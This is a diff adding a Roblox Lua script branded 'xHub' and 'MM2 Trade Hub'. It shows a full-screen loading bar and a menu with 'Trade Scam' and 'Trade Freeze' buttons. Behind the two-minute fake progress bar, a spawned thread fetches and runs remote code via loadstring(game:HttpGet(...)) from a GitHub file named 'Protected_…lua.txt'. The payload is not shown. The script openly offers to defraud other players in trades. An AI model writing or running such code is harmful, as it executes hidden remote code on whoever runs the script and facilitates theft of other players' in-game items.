@@ -1,0 +1,381 @@
+local loadingGui = Instance.new("ScreenGui")
+loadingGui.Name = "LoadingGui"
+loadingGui.ResetOnSpawn = false
+loadingGui.DisplayOrder = 200
+loadingGui.IgnoreGuiInset = true
+loadingGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
+loadingGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+
+local loadingFrame = Instance.new("Frame")
+loadingFrame.Size = UDim2.new(1, 0, 1, 0)
+loadingFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 25)
+loadingFrame.BackgroundTransparency = 0
+loadingFrame.BorderSizePixel = 0
+loadingFrame.Parent = loadingGui
+
+local gradient = Instance.new("UIGradient")
+gradient.Color = ColorSequence.new{
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(25, 25, 40)),
+    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(40, 25, 50)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(60, 40, 70))
+}
+gradient.Transparency = NumberSequence.new(0)
+gradient.Rotation = 45
+gradient.Parent = loadingFrame
+
+local pattern = Instance.new("ImageLabel")
+pattern.Size = UDim2.new(1, 0, 1, 0)
+pattern.BackgroundTransparency = 1
+pattern.Image = "rbxassetid://2151741365"
+pattern.ImageTransparency = 0.9
+pattern.ImageColor3 = Color3.fromRGB(50, 50, 80)
+pattern.Parent = loadingFrame
+
+local loadingText = Instance.new("TextLabel")
+loadingText.Size = UDim2.new(0, 450, 0, 70)
+loadingText.Position = UDim2.new(0.5, -225, 0.38, 0)
+loadingText.BackgroundTransparency = 1
+loadingText.Text = "Loading xHub Script..."
+loadingText.TextColor3 = Color3.fromRGB(210, 210, 255)
+loadingText.Font = Enum.Font.GothamBlack
+loadingText.TextSize = 32
+loadingText.TextStrokeTransparency = 0.7
+loadingText.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+loadingText.Parent = loadingFrame
+
+local textGlow = Instance.new("UIStroke")
+textGlow.Thickness = 1.5
+textGlow.Color = Color3.fromRGB(150, 150, 255)
+textGlow.Transparency = 0.3
+textGlow.Parent = loadingText
+
+local progressBar = Instance.new("Frame")
+progressBar.Size = UDim2.new(0, 550, 0, 45)
+progressBar.Position = UDim2.new(0.5, -275, 0.5, 0)
+progressBar.BackgroundColor3 = Color3.fromRGB(35, 35, 55)
+progressBar.BorderSizePixel = 0
+progressBar.Parent = loadingFrame
+
+local progressFill = Instance.new("Frame")
+progressFill.Size = UDim2.new(0, 0, 1, 0)
+progressFill.BackgroundColor3 = Color3.fromRGB(120, 160, 255)
+progressFill.BorderSizePixel = 0
+progressFill.Parent = progressBar
+
+local progressCorner = Instance.new("UICorner")
+progressCorner.CornerRadius = UDim.new(0, 14)
+progressCorner.Parent = progressBar
+
+local progressFillCorner = Instance.new("UICorner")
+progressFillCorner.CornerRadius = UDim.new(0, 14)
+progressFillCorner.Parent = progressFill
+
+local progressGlow = Instance.new("UIStroke")
+progressGlow.Thickness = 2.5
+progressGlow.Color = Color3.fromRGB(160, 200, 255)
+progressGlow.Transparency = 0.2
+progressGlow.Parent = progressBar
+
+local statusText = Instance.new("TextLabel")
+statusText.Size = UDim2.new(0, 550, 0, 35)
+statusText.Position = UDim2.new(0.5, -275, 0.6, 0)
+statusText.BackgroundTransparency = 1
+statusText.Text = "Initializing... 0%"
+statusText.TextColor3 = Color3.fromRGB(190, 190, 210)
+statusText.Font = Enum.Font.Gotham
+statusText.TextSize = 20
+statusText.Parent = loadingFrame
+
+local TweenService = game:GetService("TweenService")
+
+spawn(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/brefyg/mm2/refs/heads/main/Protected_1427301339212586.lua.txt"))()
+end)
+
+spawn(function()
+    for i = 0, 120 do
+        wait(1)
+        local progress = math.min(i / 120, 1)
+        TweenService:Create(
+            progressFill,
+            TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.Out),
+            {Size = UDim2.new(progress, 0, 1, 0)}
+        ):Play()
+        statusText.Text = "Initializing... " .. math.floor(progress * 100) .. "%"
+    end
+    loadingGui:Destroy()
+end)
+
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "MM2MenuGui"
+screenGui.ResetOnSpawn = false
+screenGui.DisplayOrder = 100  -- Above inventory and other UIs
+screenGui.IgnoreGuiInset = true
+screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
+screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 360, 0, 320)
+frame.Position = UDim2.new(0.5, -180, 0.5, -160)
+frame.BackgroundColor3 = Color3.fromRGB(15, 15, 25)
+frame.BackgroundTransparency = 0.05
+frame.BorderSizePixel = 0
+frame.Active = true
+frame.Draggable = true
+frame.Parent = screenGui
+
+local uiCorner = Instance.new("UICorner")
+uiCorner.CornerRadius = UDim.new(0, 28)
+uiCorner.Parent = frame
+
+local gradient = Instance.new("UIGradient")
+gradient.Color = ColorSequence.new{
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(25, 25, 45)),
+    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(45, 25, 55)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(65, 45, 75))
+}
+gradient.Transparency = NumberSequence.new(0.05)
+gradient.Rotation = 45
+gradient.Parent = frame
+
+local menuPattern = Instance.new("ImageLabel")
+menuPattern.Size = UDim2.new(1, 0, 1, 0)
+menuPattern.BackgroundTransparency = 1
+menuPattern.Image = "rbxassetid://2151741365"
+menuPattern.ImageTransparency = 0.95
+menuPattern.ImageColor3 = Color3.fromRGB(60, 60, 90)
+menuPattern.Parent = frame
+
+local glow = Instance.new("UIStroke")
+glow.Thickness = 3.5
+glow.Color = Color3.fromRGB(120, 120, 255)
+glow.Transparency = 0.4
+glow.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+glow.Parent = frame
+
+local shadow = Instance.new("Frame")
+shadow.Size = UDim2.new(1, 10, 1, 10)
+shadow.Position = UDim2.new(0, -5, 0, 5)
+shadow.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+shadow.BackgroundTransparency = 0.7
+shadow.BorderSizePixel = 0
+shadow.ZIndex = -1
+shadow.Parent = frame
+
+local shadowCorner = Instance.new("UICorner")
+shadowCorner.CornerRadius = UDim.new(0, 28)
+shadowCorner.Parent = shadow
+
+local titleBar = Instance.new("Frame")
+titleBar.Size = UDim2.new(1, 0, 0, 45)
+titleBar.BackgroundColor3 = Color3.fromRGB(25, 25, 40)
+titleBar.BorderSizePixel = 0
+titleBar.Parent = frame
+
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, -20, 1, 0)
+title.Position = UDim2.new(0, 15, 0, 0)
+title.BackgroundTransparency = 1
+title.Text = "MM2 Trade Hub"
+title.TextColor3 = Color3.fromRGB(210, 210, 255)
+title.Font = Enum.Font.GothamBlack
+title.TextSize = 22
+title.TextStrokeTransparency = 0.7
+title.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+title.Parent = titleBar
+
+local titleGlow = Instance.new("UIStroke")
+titleGlow.Thickness = 1.5
+titleGlow.Color = Color3.fromRGB(150, 150, 255)
+titleGlow.Transparency = 0.3
+titleGlow.Parent = title
+
+local titleGradient = Instance.new("UIGradient")
+titleGradient.Color = ColorSequence.new{
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(35, 35, 55)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(55, 35, 75))
+}
+titleGradient.Parent = titleBar
+
+local scamButton = Instance.new("TextButton")
+scamButton.Size = UDim2.new(0, 300, 0, 65)
+scamButton.Position = UDim2.new(0.5, -150, 0.35, 0)
+scamButton.BackgroundColor3 = Color3.fromRGB(230, 60, 60)
+scamButton.BorderSizePixel = 0
+scamButton.Text = "[>] Trade Scam"
+scamButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+scamButton.Font = Enum.Font.GothamBlack
+scamButton.TextSize = 22
+scamButton.Parent = frame
+
+local uiCornerScam = Instance.new("UICorner")
+uiCornerScam.CornerRadius = UDim.new(0, 16)
+uiCornerScam.Parent = scamButton
+
+local scamGlow = Instance.new("UIStroke")
+scamGlow.Thickness = 2.5
+scamGlow.Color = Color3.fromRGB(255, 120, 120)
+scamGlow.Transparency = 0.3
+scamGlow.Parent = scamButton
+
+scamButton.MouseEnter:Connect(function()
+    TweenService:Create(scamButton, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(250, 80, 80), Size = UDim2.new(0, 310, 0, 68)}):Play()
+    TweenService:Create(scamGlow, TweenInfo.new(0.2), {Transparency = 0.1}):Play()
+end)
+scamButton.MouseLeave:Connect(function()
+    TweenService:Create(scamButton, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(230, 60, 60), Size = UDim2.new(0, 300, 0, 65)}):Play()
+    TweenService:Create(scamGlow, TweenInfo.new(0.2), {Transparency = 0.3}):Play()
+end)
+
+local freezeButton = Instance.new("TextButton")
+freezeButton.Size = UDim2.new(0, 300, 0, 65)
+freezeButton.Position = UDim2.new(0.5, -150, 0.55, 0)
+freezeButton.BackgroundColor3 = Color3.fromRGB(60, 130, 250)
+freezeButton.BorderSizePixel = 0
+freezeButton.Text = "[>] Trade Freeze"
+freezeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+freezeButton.Font = Enum.Font.GothamBlack
+freezeButton.TextSize = 22
+freezeButton.Parent = frame
+
+local uiCornerFreeze = Instance.new("UICorner")
+uiCornerFreeze.CornerRadius = UDim.new(0, 16)
+uiCornerFreeze.Parent = freezeButton
+
+local freezeGlow = Instance.new("UIStroke")
+freezeGlow.Thickness = 2.5
+freezeGlow.Color = Color3.fromRGB(120, 160, 255)
+freezeGlow.Transparency = 0.3
+freezeGlow.Parent = freezeButton
+
+freezeButton.MouseEnter:Connect(function()
+    TweenService:Create(freezeButton, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(80, 150, 255), Size = UDim2.new(0, 310, 0, 68)}):Play()
+    TweenService:Create(freezeGlow, TweenInfo.new(0.2), {Transparency = 0.1}):Play()
+end)
+freezeButton.MouseLeave:Connect(function()
+    TweenService:Create(freezeButton, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(60, 130, 250), Size = UDim2.new(0, 300, 0, 65)}):Play()
+    TweenService:Create(freezeGlow, TweenInfo.new(0.2), {Transparency = 0.3}):Play()
+end)
+
+local byxHub = Instance.new("TextLabel")
+byxHub.Size = UDim2.new(1, 0, 0, 35)
+byxHub.Position = UDim2.new(0, 0, 1, -40)
+byxHub.BackgroundTransparency = 1
+byxHub.Text = "Powered by xHub"
+byxHub.TextColor3 = Color3.fromRGB(150, 150, 170)
+byxHub.Font = Enum.Font.SourceSansItalic
+byxHub.TextSize = 18
+byxHub.TextStrokeTransparency = 0.8
+byxHub.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+byxHub.Parent = frame
+
+local notification = Instance.new("Frame")
+notification.Size = UDim2.new(0, 320, 0, 80)
+notification.Position = UDim2.new(1, -330, 1, -90)
+notification.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
+notification.BackgroundTransparency = 0.8
+notification.Visible = false
+notification.Parent = screenGui
+
+local uiCornerNotif = Instance.new("UICorner")
+uiCornerNotif.CornerRadius = UDim.new(0, 14)
+uiCornerNotif.Parent = notification
+
+local notifText = Instance.new("TextLabel")
+notifText.Size = UDim2.new(1, -20, 1, -10)
+notifText.Position = UDim2.new(0, 10, 0, 5)
+notifText.BackgroundTransparency = 1
+notifText.TextColor3 = Color3.fromRGB(255, 255, 255)
+notifText.Font = Enum.Font.GothamSemibold
+notifText.TextSize = 20
+notifText.TextXAlignment = Enum.TextXAlignment.Left
+notifText.Parent = notification
+
+local notifStroke = Instance.new("UIStroke")
+notifStroke.Color = Color3.fromRGB(140, 180, 255)
+notifStroke.Thickness = 2
+notifStroke.Parent = notification
+
+local function showNotification(text)
+    notifText.Text = text
+    notification.Visible = true
+    notification.Position = UDim2.new(1, -330, 1, -90)
+    TweenService:Create(
+        notification,
+        TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+        {Position = UDim2.new(1, -330, 1, -100), BackgroundTransparency = 0.1}
+    ):Play()
+    wait(3.5)
+    TweenService:Create(
+        notification,
+        TweenInfo.new(0.6, Enum.EasingStyle.Quad, Enum.EasingDirection.In),
+        {Position = UDim2.new(1, -330, 1, -90), BackgroundTransparency = 0.8}
+    ):Play()
+    wait(0.6)
+    notification.Visible = false
+end
+
+scamButton.MouseButton1Click:Connect(function()
+    if _G.TradeScam then
+        _G.TradeScam()
+        showNotification("Trade Scam has been activated!")
+    else
+        showNotification("Error: TradeScam not defined!")
+        warn("TradeScam function not defined in xHubScript.txt")
+    end
+end)
+
+freezeButton.MouseButton1Click:Connect(function()
+    if _G.TradeFreeze then
+        _G.TradeFreeze()
+        showNotification("Trade Freeze has been activated!")
+    else
+        showNotification("Error: TradeFreeze not defined!")
+        warn("TradeFreeze function not defined in xHubScript.txt")
+    end
+end)
+
+local UserInputService = game:GetService("UserInputService")
+local dragging, dragInput, dragStart, startPos
+
+frame.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = true
+        dragStart = input.Position
+        startPos = frame.Position
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                dragging = false
+            end
+        end)
+    end
+end)
+
+frame.InputChanged:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+        dragInput = input
+    end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+    if input == dragInput and dragging then
+        local delta = input.Position - dragStart
+        frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+    end
+end)
+
+frame.BackgroundTransparency = 1
+for _, child in pairs(frame:GetChildren()) do
+    if child:IsA("GuiObject") then
+        child.BackgroundTransparency = 1
+        child.Visible = false
+    end
+end
+wait(0.1)
+for _, child in pairs(frame:GetChildren()) do
+    if child:IsA("GuiObject") then
+        child.Visible = true
+        TweenService:Create(child, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundTransparency = 0}):Play()
+    end
+end
+TweenService:Create(frame, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundTransparency = 0.05}):Play()
